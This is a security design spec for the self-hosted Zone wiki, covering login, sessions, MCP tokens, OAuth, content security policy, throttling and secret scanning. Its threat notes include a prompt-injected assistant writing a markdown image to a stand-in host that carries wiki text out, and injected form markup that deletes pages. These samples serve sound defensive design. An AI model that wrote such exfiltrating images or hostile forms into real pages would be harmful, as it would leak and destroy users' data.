# Security

Part of Zone's spec (see `AGENTS.md` for the index).

How Zone protects the wiki: the login gate, the MCP token, the Host and Origin checks, framing, HTTPS cookies and throttling.
Each rule has tests in `tests/test_routes.py` or `tests/test_mcp.py`, and `go/security_test.go`.

## Principles

These are the rules the sections below follow (Goals & Principles in `AGENTS.md`).
A new feature is checked against them, and a protection that breaks one is a bug.

- **Closed until opened on purpose.**
  Every door (the browser, MCP, the files, mail links) refuses until a rule lets the request in, and a new door adds no way around a rule that holds at another.
- **Least privilege.**
  A token, an invite or reset link, or a user can do what it was given and no more.
  A leaked one is limited, expires or can be revoked: tokens are per user, links carry a token that is used up or times out, and a user's token goes with the user.
- **Input is untrusted.**
  It is checked on arrival and escaped on output; what Zone shows from elsewhere (images, frames, links) is limited to what the wiki allows (`external-content`).
- **Secrets stay out of git, logs and error messages.**
  The key, the tokens and the password hashes are files with mode 0600 or settings that git doesn't see; see No secrets in the repo, below.
- **One permission model.**
  Who may read, write or administer a page, a task, a list or a folder is decided in one place that every door asks: the web UI, the MCP tools, search, history, exports and mail.
  A door never works out access itself, so two doors never disagree.
- **Deny by default.**
  What no rule allows is refused, and a missing or unreadable setting never grants more than its absence.
- **An agent acts for a user and has no more than that user.**
  An MCP token is a user's, so a tool sees and changes what its user may (Several users in `docs/spec/users.md`).
- **What you may not see is not there.**
  It is not in a search result, a count, a link's preview, a history or a diff, a mail, or the wording of an error: a refusal for a page you may not read looks the same as a page that doesn't exist.
- **Each rule is tested at each door**, including that a denied thing is really denied (the tests named above).

## Protections

- Optional password auth: `./run.sh config passwd` (a hash as `password` in the settings file, `.zone/config`) enables a login gate.
  If unset, no auth is required.
  Zone makes a key once and keeps it in `$ZONE_DATA/.zone/secret_key` (mode 0600, listed in `.git/info/exclude` so it never reaches git or a git remote; `secretKey()`), so restarts don't sign anyone out.
  A wiki folder Zone can't write to gets a new key per start.
  Routes `/login` (GET/POST) and `/logout` (POST) handle the session; `/welcome/<token>`, an invite or reset link's page, needs no login either (its token is the key: Invite and reset links in `docs/spec/users.md`), nor does `/signup` when sign-up is on (Sign-up there; its mail link only on `base-url`, never on the request's Host).
  A "Sign out" button is rendered in the bottom-right corner when auth is enabled and the visitor is signed in (not on the login page); on phones it sits in the status-badge row at the top, out of sight while typing (`visibility`, its place kept: taken out, the page would jump when a field loses the focus, and a tap on a form's button right after typing would miss it).
  With `ZONE_ALLOW_REMOTE`, the login page shows the 🌐 remote-access badge in its form's heading row (it has no breadcrumb for the badge to sit beside).
- **Signing out ends the session** (`go/signout.go`): the session is a signed cookie, so a copy of it (taken from a shared computer, a backup of a browser profile, a proxy's log) would work on, and be renewed, long after its owner signed out.
  Each session has an id (`session.ID`, random, kept as the cookie is renewed: `renewSession`);
  `POST /logout` puts the id of the cookie it was sent (only one Zone signed) into `.zone/signed-out` (0600, not in git, like the session key: the id and until when, never the cookie), and `signedIn` refuses a session whose id is there.
  An id is kept for a session's lifetime (30 days: by then every cookie of it has expired), then dropped at the next sign-out.
  The user's other sessions, on other devices, go on; a new password ends them all.
  A new password is set on the host (`zonewiki user passwd`, `zonewiki config passwd`), by a reset link, or in the browser on Change password (`/password`, `go/password.go`), which takes the password one has, throttled as the login is: a stolen session alone doesn't take the account over (Signing in in `docs/spec/users.md`).
  A session from before ids has the start of its signature as its id.
  Tests: `TestSigningOut` in `go/security_test.go` and in `tests/test_users.py`.
- **First run** (`go/setup.go`, `needsSetup`): a wiki that other devices can reach and that has no login shows and changes nothing until one is set: every page leads to `/setup` (302),
  everything else answers 403 "This wiki has no login yet: open it in a browser and set a password first." Only the form itself,
  `/public/`,
  `/api/health` and `/mcp` (its own token, or off) answer (`setupExempt`).
  "Other devices can reach it": `ZONE_ALLOW_REMOTE` is set,
  or `hosts` names a host,
  or the container's port is published beyond localhost,
  which compose tells Zone in `ZONE_BIND` (`Config.Published`; `compose.yaml` hands on its own `${ZONE_BIND:-127.0.0.1}`, `compose.nas.yaml`, whose port is on every interface, says `0.0.0.0`).
  On localhost alone Zone needs no login, as before; a Zone run by hand without `ZONE_BIND` isn't known to be reachable (it listens on every interface: set `ZONE_BIND=0.0.0.0` beside `ZONE_ALLOW_REMOTE`, or a login).
  **Why**: on a NAS the container is up and on the LAN from Container Manager before anyone has run a command, and the login used to need one over SSH; a wiki left there was open to the network, and nothing said so (the Host check is no login: a client on the LAN sends `Host: localhost`).
  **The form** (`GET`/`POST /setup`, `setup.html`): a password twice (at least 8 characters, `passwordMin`), and optionally a user name: without one the wiki gets its password (as `zonewiki config passwd`), with one its first user, an admin (as `zonewiki user add`; a wiki MCP token gives way).
  The settings file is checked again as it is written, so the form sets a login only where there is none: sent twice, or to a wiki with a login, it changes nothing (302).
  Whoever sets the login is signed in; the log says from which address it was set.
  Another site can't send the form (the Origin check).
  Whoever reaches a wiki first sets its login, as whoever reached it could read it before: an owner who meets a login they didn't set removes it on the host (`.zone/config`).
  **No login on purpose**: `no-login = yes` in the settings file (`zonewiki config set no-login yes`; `zonewiki user remove NAME --open` writes it), and at start the log says when Zone waits for a login.
  Tests: `tests/test_setup.py`, `test_a_wiki_without_a_login_asks_for_one_first` in `tests/e2e/test_security.py`; the tests' own server has `no-login = yes` (`settings.NO_LOGIN`).
- **Users** (`[user …]` sections in `.zone/config`, `docs/spec/users.md`) replace the one password: each signs in with a name and a password kept only as a PBKDF2 hash;
  the session cookie names the user and is valid only while they are a user and their password is the one it was signed in with (`passwordStamp`; the wiki's password likewise);
  a wrong name costs the same time as a wrong password.
  A wiki password or MCP token together with users refuses to start.
- **The settings file** `.zone/config` holds password hashes and MCP tokens,
  the tokens only as SHA-256 hashes (`tokenMatches`): it is kept out of git with the rest of `.zone/`,
  the session key above all,
  also before a new wiki's first commit (account data stays out of git: The settings file in `docs/spec/users.md`; Zone takes it out of a wiki that committed it, and won't start on a clone whose history has users but no settings file),
  and Zone never shows it (`canSeePath` is false for `.zone/`, which also holds the editor's texts left in conflict, `.zone/drafts/<user>/`, shown only to their user in their editor: no history view, uncommitted list or MCP tool; `safePath` refuses it to every page route),
  written owner-only (0600) by `zonewiki user`/`zonewiki config` and the Users tab,
  and Zone logs a warning when others may read it.
  A reload with an error keeps the settings from before (a broken edit neither locks everyone out nor opens the wiki), and so does removing the file while Zone runs;
  `GET /api/health` (no login, for the healthcheck) then answers 503 with the error, which never repeats a password or token, and which it gives only with a session (or in a wiki without a login): it may name users, so without one the answer points to the log.
  Reloading in `docs/spec/users.md`.
- **Public wikis** (`ZONE_PUBLIC` in `.env`, the deployment's settings; `go/access.go`, `visitorGate` in `go/server.go`): a wiki with users can be shown to people who haven't signed in, **visitors**.
  `ZONE_PUBLIC=view` lets anyone read the wiki's shared pages; `ZONE_PUBLIC=edit` lets them edit and make pages too.
  Unset (the default), `off`, or a wiki without users: everyone signs in, as before; any other value stops Zone at start.
  - **Where it is set**: in `.env`, not in the wiki's settings file, because it is a decision of whoever runs the server: it opens the login gate, so an admin of the wiki (or an edit of `.zone/config`, which Zone reloads) can't turn it on, and a hosted wiki never has it.
    Zone says at start that the wiki is public, or that `ZONE_PUBLIC` does nothing because there are no users (with a wiki password alone there is nobody to tell a visitor from).
  - **What a visitor reaches** is a list of routes, `visitorRoutes`: the home page, a page (`/page/…`, its preview), the page list (`/pages`, `/api/pages`, `/api/pages-list`), search (`/search`, `/api/search`), a page's history, versions and diffs (`/history/…`, `/revision/…`, `/diff/…`), uploads in `_assets/`, the version.
    With `edit` also `visitorEdits`: the editor and its saves (`/edit/…`, `/api/save/…`, `/api/preview`), a new page (`/new`), a checkbox ticked on a page (`/api/toggle-checkbox/…`).
    Every other route answers a visitor exactly as it answers someone not signed in where the wiki isn't public: a redirect to `/login`.
    So a new route is closed to visitors until it is put on a list; `tests/test_public.py` asks every route Zone registers without a session, and fails for one that answers and isn't listed there too.
  - **Who a visitor is**: the checks give a request without a session the user `visitor` (`_visitor`, which is no user's name: names have no `_`), only while the wiki is public, and only on its way to the gate.
    The rules in `go/access.go` then answer for it as for a stranger: no private page (`canSee`), no private folder (`privateFolder`), no task at all (`canSeeTask`, and the task store's `NoTasks`, which every read of the task files asks: `Owners`), no task write (`mayWriteTasks`).
    With `view` a visitor is a viewer (`isViewer`), so every rule that keeps a viewer from changing anything holds for them too; with `edit` they write the shared pages as an editor does, but never a guide (`adminsOnly`).
  - **Not for visitors, in either mode**: tasks (no Tasks module, no task list on a page: its `[[tasks: …]]` is left out, a `[[task:…]]` reads as a task that isn't there, no task in search, no Linked tasks), notes, private pages, uploading, renaming, deleting or restoring a page, Commit and the uncommitted list, the deleted pages, the admin and account pages, `/mcp` (which wants a token as ever).
    Renaming, deleting and uploading stay out of `edit` on purpose: an anonymous edit is undone from the page's history, a deleted page or a wiki filled with files less easily.
  - **No user's name**: a page's history shows a visitor when it changed and what, not who (`pageLog`; a visitor's own changes say "anonymous"), and a merge names no one (`otherAuthor`). Names in a page's text are the page's.
  - **What is public is everything shared**: every page outside `private/` (a note from before the wiki had users, at its top level, is such a page), with its whole git history, and every file in `_assets/` for whoever knows its name (a page's images, but also a file attached to a task).
    There is no public part of a wiki yet: keep what isn't for everyone in a private folder, or in another wiki.
  - **A visitor's edits** are committed as **anonymous** (`visitorAuthor`), and every visitor is the same one to Zone: two of them on one page merge as one user's two tabs do. `storage-max` bounds what they can add.
    No draft is kept for a visitor who leaves a page in conflict (`leaveDraft`): it would be shown to the next one. A user called `anonymous` can't be told from them in the history (Zone says so at start).
    A user whose session ends is a visitor from then on: where visitors edit, an editor left open saves as anonymous.
    What `edit` takes on: a page then holds whatever a stranger wrote, so an assistant that reads the wiki reads that too (the guides stay an admin's, and a page's scripts never run: `pageCSP`), a `[[tasks: … pin=1]]` a visitor writes is a pinned list for the users, and nothing throttles saves (each Done is a commit): put a rate limit in the reverse proxy in front of a wiki strangers can write.
  - **Search** leaves out, for a visitor, a page that refers to tasks (`[[task:…]]`; `visitorSkips` in `go/retrieval.go`): search reads such a page with the tasks' titles in place of the references, and a match or an excerpt would give a title away. The page itself they open and read.
  - **The interface** (`pageShell.Visitor`, `body[data-visitor]`): **Sign in** at the top right (on a phone in the page's top row), which comes back to the page; the module switcher shows the wiki alone; no New note or New task, no uncommitted badge, no Commit.
    With `view` no Edit, as for a viewer; with `edit` Edit and the editor, without Rename, Delete, Attach, Task list, Make task and Link to a task.
  - Signed in, nothing changes: a user sees and does what their role allows.
- **Private pages and tasks** (with users, `private/<user>/`, tasks in `private/<user>/_tasks/`, `docs/spec/users.md`): another user's are left out of every list,
  count and search and are 404 when opened directly,
  also when they don't exist (`refusePage`; an unknown task id likewise),
  so nothing tells what is in someone's folder.
  The rules are `go/access.go` alone (`canSee`, `canWrite`, `canSeePath`, `canSeeTask`); `tests/test_privacy.py` probes every route and MCP tool for leaks, and fails for a new one that isn't probed.
  Private is hidden inside Zone, not encrypted: the files, git history and a git remote hold everything.
- `/mcp` requires a token: an MCP token, `mcp-token` in the settings file (a bearer token, kept there as its hash; with users, a user's own, and the tools act as that user), or the access token of a connection a signed-in user allowed (OAuth, below).
  Without a login and without a token set it is off (403), because its tools write pages and tasks; with a login it answers 401 and says where to sign in. Nothing is reached without a token someone signed in made or allowed.
  Don't make it open again (see Auth in `docs/spec/mcp.md`).
  The same token, sent as a bearer token, also uploads and downloads files (`POST /api/upload`, `GET /_assets/…`, `/private/<user>/_assets/…`, `/groups/<group>/_assets/…` and `/_tasks/files/<id>/_assets/…`), as its user and throttled like `/mcp`, and nothing else: every other route still wants a session (Files in `docs/spec/mcp.md`).
  A token is made on the host (`zonewiki config token`, `zonewiki user token`) or in the browser by whoever is signed in, for themselves only and with their password again, so a stolen session alone makes none (`/assistant`, Connect an assistant in `docs/spec/mcp.md`).
- **OAuth for `/mcp`** (`go/oauth.go`, Connecting with OAuth in `docs/spec/mcp.md`; only with a login, off with `mcp-oauth = no`): an assistant is let in by its user, in the browser, with their password again.
  What keeps it safe, and isn't to be weakened:
  the answer (the code) goes only to a redirect URI the client registered, https or this computer, and an unknown client or URI gets a page, never a redirect;
  PKCE (S256) is required, so a code is no use without its verifier;
  codes last a minute and work once; tokens are kept as hashes; a refresh token works once, and one seen twice ends the connection;
  Allow takes the password again and is behind the Origin check; the consent page names the client only as a claim and shows where the answer goes.
  `/oauth/token`, `/oauth/register` and the metadata under `/.well-known/oauth-*` need no session and skip the Origin check (`oauthOpen`): a client's server calls them, and they act on nothing a cookie gives.
  Registration keeps nothing (the client id is signed), so strangers can't fill the wiki.
  **Least privilege for a connection**: its user can give it only some of their places (not their private pages and tasks, only some of their groups; Connections given less to see in `docs/spec/mcp.md`), and can let it only read (chosen on the consent page, or later on Connect an assistant, where a connection is only ever made narrower without the password); such a connection is refused every write by the permission model (`changesNothing` in `go/access.go`; Read-only connections in `docs/spec/mcp.md`).
  The page policy is unchanged: `form-action 'self'` stays, and the answer after Allow is a page with a `Refresh` header instead of a redirect.
  None of it answers during first run.
- **Zone's own folders are not served**: `.zone/` (the session key, the settings file, the semantic cache),
  `.git/`,
  `_tasks/` and every other folder starting with `_` or `.` hold no pages,
  and `safePath()` refuses slugs in them,
  so no page route reads or writes there (Routes in `docs/spec/routes.md`).
  Uploads are served only from `_assets/` by name (`/_assets/<filename>`, `/private/<user>/_assets/<filename>` to that user only, `/groups/<group>/_assets/<filename>` to the group's members only, and `/_tasks/files/<task id>/_assets/<filename>` to who sees the task), the client code only from `public/`.
- The request checks around every route (`checks` in `go/server.go`) first validate the `Host` header (`hostAllowed`) against `allowedHosts` (`localhost`, `127.0.0.1`, `[::1]`) plus the names in `hosts` (the settings file; comma-separated),
  each at any port (Zone may listen on another, `--addr :8080`) and without case (`hostName`),
  defeating DNS rebinding attacks (a rebinding page's `Host` is its own name).
  `ZONE_ALLOW_REMOTE=1` (in `.env`) without `hosts` skips the check (LAN access by IP); with `hosts` set the check stays on.
  Behind a reverse proxy on the same host, `hosts` alone is enough (the port stays on loopback).
- **Scripts in pages don't run** (`pageCSP`): every response carries a `Content-Security-Policy` with `script-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'self'` (and what a page may load, below).
  Pages render their raw HTML as written,
  and pages are also written by AI clients over MCP,
  which may have read a prompt injection in a mail or a web page: a `<script>`,
  an `onerror=` handler or a `javascript:` link in a page would otherwise run with the user's session and could read,
  rewrite or send away the whole wiki.
  Under `script-src 'self'` without `'unsafe-inline'`/`'unsafe-eval'` only Zone's own script files run (Zone has no inline scripts, `on…=` handlers or `eval`; the browser tests fail on any CSP violation of Zone's own pages, see `docs/spec/testing.md`);
  this holds in the editor preview and the search preview too, which insert rendered HTML with `innerHTML`.
  `object-src 'none'`: no plugins; `base-uri 'self'`: no `<base>` that re-points Zone's relative script paths; `form-action 'self'`: no form in a page that posts elsewhere.
  **No form in a page posts to Zone either** (`defuseHTML` in `go/markdown.go`): such a post is same-origin,
  so the Origin check lets it through,
  and one click on a page another user,
  or an assistant that read a prompt injection,
  wrote (`<form method=post action="/delete/…">`, a `<button formaction=…>` or `<button form=…>` borrowing one of Zone's own forms) would delete or overwrite the viewer's pages.
  So in a page's raw HTML,
  and in task descriptions and comments,
  the tags that make or submit a form (`form`, `input`, `button`, `select`, `textarea`, `option`, `optgroup`, `datalist`, `fieldset`, `keygen`, `isindex`) and those that change what the page is (`meta`, a refresh to another site; `base`) show as text: their `<` is escaped.
  An iframe's `srcdoc` is renamed (`data-defused-srcdoc`), so the frame is empty: it is a document of the page's own origin and policy, and its form would be written with entities (`&lt;form`), which the tag check can't see.
  It is renamed wherever `srcdoc` is followed by `=` (or ends the raw HTML: what is rendered next may start with the `=`),
  not only inside what a pattern takes for a tag: a browser ends tags and quoted values by its own rules (in `<iframe a=b' srcdoc=…>` the quote belongs to `a`'s value),
  and a pattern that read it otherwise let the attribute through.
  Zone's own checkboxes and controls aren't raw HTML and stay.
  The rest of a page's HTML (images, links, iframes, styles) stays allowed, as far as it loads from Zone itself (below).
  `X-Content-Type-Options: nosniff` on every response, so no JSON or text response runs as a script, and uploads not shown inline go out as `application/octet-stream` (`serveUpload`), so an uploaded `.js` can't be loaded by `<script src>` either, as `script-src 'self'` trusts Zone's own origin.
- **Guides are an admin's to write** (with users; `adminsOnly` in `go/access.go`, Guides in `docs/spec/users.md`): `wiki-guide`,
  a folder's `AGENTS.md`/`CLAUDE.md` and the pages they pull in are what every user's assistant is told to follow,
  so an editor (or an assistant that read a prompt injection) writing one would steer everyone's.
- **A page's name is never a pattern to git** (the environment in `go/internal/gitrepo`): a page may be called anything a file may (`*`,
  `p?`,
  `:(glob)**/x`: the editor's routes take the slug as it is), and git reads a path it is handed as a pathspec, where such a name matches other files: `git show <sha> -- '*.md'` is every page's diff, another user's private pages among them, and likewise a page's log, its uncommitted changes and the commit that deleted it. So every git Zone runs has `GIT_LITERAL_PATHSPECS=1` (git's `--literal-pathspecs`): a path names that one file. Two calls turn it off: `grepPages`, whose `*.md` is Zone's own pattern, and `check-ignore`, which takes names as they are and refuses the setting. `tests/test_privacy.py` asks for the history, versions, changes and deleted page of names that match alice's files.
- **A task snapshot's ids and times are checked** (`sanitizeSnapshot` in `go/tasklogic.go`; `POST /api/tasks/restore`, `/api/tasks/import`): an `id` or `spawned_from` only of letters,
  digits,
  `-` and `_` (at most 64; anything else: a new id, no `spawned_from`),
  `created_at` and `closed_at` only as `timestamp()` writes them or a day alone (else now),
  a comment's id likewise (else a new one),
  and `by` on a comment or history entry only what could be a user's name (else no one).
  With users, a `by` other than the sender's own stays only on what Zone has seen under that name (`checkBy` in `go/taskby.go`; Who made a change in `docs/spec/users.md`): else a user could restore or import a task with a comment "by" a colleague.
  The browser builds the task cards from these, so markup in them would be an element on every user's task list, a form among them (the same one click as a form in a page).
  The cards escape them as well (`esc()` in `public/js/taskrender.js`): a tasks file written by hand may hold anything.
- **A page loads nothing from other hosts** (`pageCSP`): `default-src 'self'`, with `img-src` and `media-src 'self' data: blob:`, `frame-src 'self'`, `font-src 'self' data:`, `connect-src 'self'`, `style-src 'self' 'unsafe-inline'`.
  An image,
  frame,
  stylesheet or font on another host is a request whose address the page's writer chose,
  and so a way to send text away with no script at all: an assistant that read a prompt injection writes `![](https://elsewhere.example/?<what it read>)`,
  and the reader's browser delivers it on opening the page;
  a frame from elsewhere can show a sign-in form that isn't Zone's.
  Inline styles stay (a page's own `style=`, KaTeX's, Mermaid's): a `url()` in one is an image, so under `img-src`.
  **A markdown image on another host is shown as a link to it** (`blockedImage` in `go/markdown.go`: `<a class="external-image">` with the alt text, or the address), not as a broken image; raw HTML naming another host is just not loaded.
  `<link>` in a page's raw HTML shows as text (`defusedTagRE`): `rel=dns-prefetch` makes the browser look a host name up, which no policy stops.
  Every response also carries `Referrer-Policy: same-origin`.
  **`external-content`** (the settings file) names hosts images, media and frames may come from all the same: `upload.wikimedia.org, *.example.org`, or `*` for any, which is how Zone was before (`externalRE`: host names only, so the setting can't add a rule to the policy; `Settings.loadsFrom`).
  Scripts, styles and fonts never come from elsewhere.
  Links stay links: following one is the reader's own doing.
  Tests: `TestProduction` in `tests/test_routes.py`, `test_a_page_asks_no_other_host_for_anything` in `tests/e2e/test_security.py` (whose harness fails on any request to another host).
- **Regexes from AI clients can't hang the server**: `grep_wiki` runs `git grep` in its own process, killed after 10 s; `replace_in_pages` matches with Go's RE2, which takes time linear in the text (no backtracking, so no lookarounds or backreferences).
  `replace_in_pages` in `docs/spec/mcp.md`.
- **Clickjacking**: `frame-ancestors 'self'` in that policy (added to an existing one, e.g. an SVG upload's sandbox policy) and `X-Frame-Options: SAMEORIGIN` (`pageCSP`), so no other site can frame Zone.
- **Self-hosting behind HTTPS**: the session cookie is `Secure` when the request came over HTTPS, Zone's own or a proxy's `X-Forwarded-Proto: https` (`isHTTPS`); over plain http (localhost, LAN) it works as before.
  Wrong passwords and wrong MCP tokens are throttled per client (`Throttle`, `loginThrottle`/`mcpThrottle`, in memory): after 5 failures in a row each try waits 1 minute, doubling up to an hour, refused unchecked (429, the login page says how long; `/mcp` sends `Retry-After`);
  a success clears the client.
  A client's tries are checked one at a time (`Throttle.try`: the wait, the check and the count as one step), so tries sent at once aren't all let in before the first counts as a failure (a hundred connections were a hundred guesses per wait).
  The client (`clientKey`) is the remote address,
  an IPv6 address by its /64 (`network`: a client has that whole network to take addresses from, and each would have five tries of its own),
  or,
  when that is a trusted proxy (`trusted-proxies` in the settings file; unset: loopback),
  the last `X-Forwarded-For` entry that isn't itself a trusted proxy (the one the proxy appended; entries before it are the client's to make up).
  Anyone else's `X-Forwarded-For` is ignored: a client on the LAN, which reaches Zone without a proxy, could otherwise send a new one with every guess and never be throttled.
  On a Unix socket (`--addr unix:PATH`, A Unix socket in `docs/spec/deployment.md`) the peer is the proxy whatever `trusted-proxies` says (`onSocket`): it has no address for the setting to name, and only what is on the machine and may reach the socket's path connects there; without the header it counts as `127.0.0.1`.
  A Zone that exits when idle (`ZONE_IDLE_EXIT`, Started by systemd in `docs/spec/deployment.md`) stays up while a throttle remembers a wrong try (`Throttle.remembers`), so the count isn't lost to an exit.
  A peer on a private network that sends the header without being trusted (likely a proxy in a container network, `172.17.0.1`) is named once in the log with the `config set trusted-proxies` that trusts it; until then its clients count as one.
  Secrets are compared as bytes (`sameSecret`), so non-ASCII passwords work.
- **Request bodies are capped** (`checks`): at most 16 MB (`bodyMax`: a page, a task, an MCP call), an upload (`/api/upload`) 100 MB, or the settings' `upload-max` (`Settings.uploadMax`; reloaded with them, so a change needs no restart).
  A body over it is refused with 413 (`Too large: at most 16 MB`, the size as `formatSize` writes it) on its `Content-Length`, before it is read;
  one sent without a length (chunked) is cut at the limit (`http.MaxBytesReader`, `tooLarge`), and the routes that read whole bodies (the page writes, `/mcp`, the preview, the tasks API) answer that with 413 too.
  Without the cap, one request could fill the server's memory or disk; what the whole wiki may hold is `storage-max` (Storage limit in `docs/spec/users.md`).
- **A client that stands still doesn't hold a connection** (`noStalls` in `go/stalls.go`, around every route): Zone serves at most 100 connections at a time (`limitListener`),
  so a hundred clients that sent half a request and then nothing,
  or asked for a large file and never read it,
  would be all of them.
  A request's headers have 10 s (`ReadHeaderTimeout`),
  a connection between requests 60 s (`IdleTimeout`),
  and every read of a request's body and every write of a response 60 s (`stallTime`; `steadyBody`, `steadyWriter`, a deadline set anew each time): one that gets nowhere fails,
  and the connection is closed.
  There is no limit on the whole request: a large upload or download over a slow line takes as long as it takes, while it moves; nor on what a route does between reading and answering (a search, a git command).
  A body a route never reads has 60 s from the request's start.
  This ends stalled connections, the forgotten and the careless; a client that sends a byte a minute on a hundred connections still holds them, which is the reverse proxy's to limit on a wiki open to the internet.
  Tests: `go/stalls_test.go`.
- **Cross-site writes are refused** (`crossSite`, checked after the Host check): a POST/PUT/PATCH/DELETE whose `Origin` header names another site,
  or is `null` (sandboxed iframe),
  gets 403. Without it any web page could post a form to `localhost:5000` and delete or overwrite pages,
  or write tasks (the tasks API parses text/plain bodies, which need no CORS preflight),
  and raw HTML in markdown would turn an overwrite into a stored script.
  Requests without `Origin` (curl, scripts) are allowed.
  Behind a reverse proxy the proxy must pass the original `Host` through, or same-origin writes would be refused.
- **No secrets in the repo**: `.env` (tokens, password) is gitignored.
  The pre-commit hook `.githooks/pre-commit` (on once per clone: `git config core.hooksPath .githooks`) runs gitleaks over the staged changes, with a local gitleaks or else `./run.sh leaks --pre-commit --staged` in the tools image; a leak (exit 3) refuses the commit, a scan that can't run only warns.
  For `commit -a` and `commit <path>` git hands the hook a temporary index (`GIT_INDEX_FILE`, a host path); `run.sh leaks` passes it into the container as a `/repo/…` path, so those changes are scanned too (an index outside the repo: exit 2, a warning).
  On the first run `run.sh` says it is building the tools image.
  In a git worktree `.git` is a file that names the repo's own `.git` by its host path, where the worktree's index is too: `run.sh leaks` mounts that folder into the container at the same path, read-only, so the hook and the scan of the history work there as in the repo (until 2026-11 they didn't: a commit in a worktree went in unchecked, with a warning).
  CI's **leaks** job scans every commit (`./run.sh leaks`). gitleaks is a pinned release, checked against its published checksums in `Containerfile.tools`.
- **What builds Zone is named by hash**: the base images by digest (`ARG UBUNTU=ubuntu:26.04@sha256:…` in the `Containerfile`, used by its three stages; the Playwright image in `Containerfile.tools`; the job container `docker:…-cli@sha256:…` in `.forgejo/workflows/ci.yml`),
  each the tag's multi-arch index,
  and every CI action by its commit (`uses: actions/checkout@<40 hex> # v4.4.0`, both workflows).
  A tag is a name its publisher, or whoever took over their account, can move to other content; the CI that follows it builds and pushes the image every NAS pulls, with the registry's token.
  Go, gitleaks, onnxruntime and the model were pinned and checked already.
  A pin doesn't follow updates: bump the base images' digests now and then (the `Docker-Content-Digest` of the registry's manifest for the tag, or `skopeo inspect`), and an action's commit with its version comment.
  `test_base_images_and_ci_actions_are_pinned_by_hash` in `tests/test_image.py`.
